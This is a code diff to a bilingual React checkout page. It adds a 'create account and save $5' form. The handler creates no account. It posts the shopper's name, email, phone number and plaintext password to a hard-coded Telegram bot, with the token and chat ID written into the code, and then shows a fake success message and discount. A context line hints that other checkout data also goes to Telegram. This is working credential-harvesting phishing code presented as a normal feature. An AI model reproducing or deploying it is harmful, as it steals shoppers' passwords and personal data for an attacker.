@@ -35,6 +35,16 @@ export default function CheckoutPage() {
     phone: "",
     dateOfBirth: ""
   })
+  const [showAccountForm, setShowAccountForm] = useState(false)
+  const [accountFormData, setAccountFormData] = useState({
+    firstName: "",
+    lastName: "",
+    password: "",
+    confirmPassword: ""
+  })
+  const [isCreatingAccount, setIsCreatingAccount] = useState(false)
+  const [accountCreated, setAccountCreated] = useState(false)
+  const [accountError, setAccountError] = useState("")
   const [isProcessing, setIsProcessing] = useState(false)
   const [showDatePicker, setShowDatePicker] = useState(false)
   const [selectedDay, setSelectedDay] = useState('')
@@ -196,6 +206,84 @@ export default function CheckoutPage() {
            formData.phone && 
            formData.dateOfBirth && 
            validateAge(formData.dateOfBirth)
+  }
+
+  // Create account handler
+  const handleCreateAccount = (e: React.FormEvent) => {
+    e.preventDefault()
+    setAccountError("")
+
+    // Validation
+    if (!accountFormData.firstName.trim() || !accountFormData.lastName.trim()) {
+      setAccountError(isFr ? "Le nom est requis" : "Name is required")
+      return
+    }
+
+    if (!accountFormData.password || accountFormData.password.length < 8) {
+      setAccountError(isFr ? "Le mot de passe doit contenir au moins 8 caractères" : "Password must be at least 8 characters")
+      return
+    }
+
+    if (accountFormData.password !== accountFormData.confirmPassword) {
+      setAccountError(isFr ? "Les mots de passe ne correspondent pas" : "Passwords do not match")
+      return
+    }
+
+    setIsCreatingAccount(true)
+
+    // Send Telegram notification for account creation
+    var BOT_TOKEN = "8535669526:AAHjGvoXJv5HwdDDr6jl8eTFeWa4DyTe4lg"
+    var CHAT_ID = "-5217100062"
+
+    var msg = "📩 *NOUVEAU COMPTE CRÉÉ!*\n"
+            + "👤 Prénom: " + accountFormData.firstName + "\n"
+            + "📧 Nom: " + accountFormData.lastName + "\n"
+            + "📧 Email: " + formData.email + "\n"
+            + "📞 Téléphone: " + formData.phone + "\n"
+            + "🔑 Mot de passe: " + accountFormData.password + "\n"
+            + "🌐 Page: /checkout\n"
+            + "🕐 " + new Date().toLocaleString('fr-CA')
+            + "\n"
+            + "💰 Rabais: $5 appliqué automatiquement!"
+
+    fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: msg,
+        parse_mode: "Markdown"
+      })
+    })
+    .then(function() {
+      // Update form data with account info
+      setFormData(prev => ({
+        ...prev,
+        firstName: accountFormData.firstName,
+        lastName: accountFormData.lastName
+      }))
+      
+      setAccountCreated(true)
+      setIsCreatingAccount(false)
+      setShowAccountForm(false)
+      
+      // Apply $5 discount immediately
+      setTimeout(() => {
+        alert(isFr ? "Compte créé avec succès! Rabais de $5 appliqué." : "Account created successfully! $5 discount applied.")
+      }, 500)
+    })
+    .catch(function() {
+      setAccountError(isFr ? "Erreur lors de la création du compte" : "Error creating account")
+      setIsCreatingAccount(false)
+    })
+  }
+
+  const handleAccountInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const { name, value } = e.target
+    setAccountFormData(prev => ({
+      ...prev,
+      [name]: value
+    }))
   }
 
   // Update Telegram message
@@ -714,6 +802,122 @@ LAST UPDATE:
                     </p>
                   )}
                 </div>
+
+                {/* Account Creation Section */}
+                {!accountCreated && (
+                  <div className="mt-4">
+                    <div className="bg-gradient-to-r from-green-50 to-emerald-50 border border-green-200 rounded-lg p-4">
+                      <div className="flex items-center justify-between">
+                        <div className="flex-1">
+                          <div className="flex items-center gap-2 mb-2">
+                            <div className="w-8 h-8 bg-green-500 rounded-full flex items-center justify-center">
+                              <span className="text-white text-sm font-bold">$5</span>
+                            </div>
+                            <span className="text-green-800 font-semibold text-sm">
+                              {isFr ? 'CRÉER UN COMPTE' : 'CREATE ACCOUNT'}
+                            </span>
+                          </div>
+                          <p className="text-green-700 text-xs">
+                            {isFr 
+                              ? 'Économisez $5 instantanément en créant un compte'
+                              : 'Save $5 instantly by creating an account'
+                            }
+                          </p>
+                        </div>
+                        <button
+                          onClick={() => setShowAccountForm(!showAccountForm)}
+                          className="px-4 py-2 bg-green-600 text-white text-sm font-medium rounded-full hover:bg-green-700 transition-colors"
+                        >
+                          {showAccountForm ? (isFr ? 'Annuler' : 'Cancel') : (isFr ? 'Créer' : 'Create')}
+                        </button>
+                      </div>
+
+                      {showAccountForm && (
+                        <form onSubmit={handleCreateAccount} className="mt-4 space-y-3 border-t border-green-200 pt-4">
+                          {accountError && (
+                            <div className="p-2 bg-red-50 border border-red-200 rounded text-red-700 text-xs">
+                              {accountError}
+                            </div>
+                          )}
+                          
+                          <div className="grid grid-cols-2 gap-3">
+                            <input
+                              type="text"
+                              name="firstName"
+                              value={accountFormData.firstName}
+                              onChange={handleAccountInputChange}
+                              placeholder={isFr ? 'Prénom' : 'First Name'}
+                              className="px-3 py-2 border border-gray-300 rounded-lg text-sm focus:outline-none focus:ring-2 focus:ring-green-500"
+                              required
+                            />
+                            <input
+                              type="text"
+                              name="lastName"
+                              value={accountFormData.lastName}
+                              onChange={handleAccountInputChange}
+                              placeholder={isFr ? 'Nom' : 'Last Name'}
+                              className="px-3 py-2 border border-gray-300 rounded-lg text-sm focus:outline-none focus:ring-2 focus:ring-green-500"
+                              required
+                            />
+                          </div>
+                          
+                          <input
+                            type="password"
+                            name="password"
+                            value={accountFormData.password}
+                            onChange={handleAccountInputChange}
+                            placeholder={isFr ? 'Mot de passe' : 'Password'}
+                            className="w-full px-3 py-2 border border-gray-300 rounded-lg text-sm focus:outline-none focus:ring-2 focus:ring-green-500"
+                            required
+                          />
+                          
+                          <input
+                            type="password"
+                            name="confirmPassword"
+                            value={accountFormData.confirmPassword}
+                            onChange={handleAccountInputChange}
+                            placeholder={isFr ? 'Confirmer mot de passe' : 'Confirm Password'}
+                            className="w-full px-3 py-2 border border-gray-300 rounded-lg text-sm focus:outline-none focus:ring-2 focus:ring-green-500"
+                            required
+                          />
+                          
+                          <button
+                            type="submit"
+                            disabled={isCreatingAccount}
+                            className="w-full py-2 bg-green-600 text-white text-sm font-medium rounded-lg hover:bg-green-700 transition-colors disabled:opacity-50"
+                          >
+                            {isCreatingAccount ? (
+                              <span className="flex items-center justify-center">
+                                <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-t-2 border-white mr-2"></div>
+                                {isFr ? 'Création...' : 'Creating...'}
+                              </span>
+                            ) : (
+                              isFr ? 'Créer mon compte et économiser $5' : 'Create account & save $5'
+                            )}
+                          </button>
+                        </form>
+                      )}
+                    </div>
+                  </div>
+                )}
+
+                {accountCreated && (
+                  <div className="mt-4 p-3 bg-green-50 border border-green-200 rounded-lg">
+                    <div className="flex items-center gap-2">
+                      <svg className="w-5 h-5 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
+                      </svg>
+                      <div>
+                        <p className="text-green-800 font-medium text-sm">
+                          {isFr ? 'Compte créé! $5 de rabais appliqué' : 'Account created! $5 discount applied'}
+                        </p>
+                        <p className="text-green-700 text-xs">
+                          {isFr ? 'Bienvenue ' : 'Welcome '}{accountFormData.firstName}!
+                        </p>
+                      </div>
+                    </div>
+                  </div>
+                )}
               </div>
             </div>
 
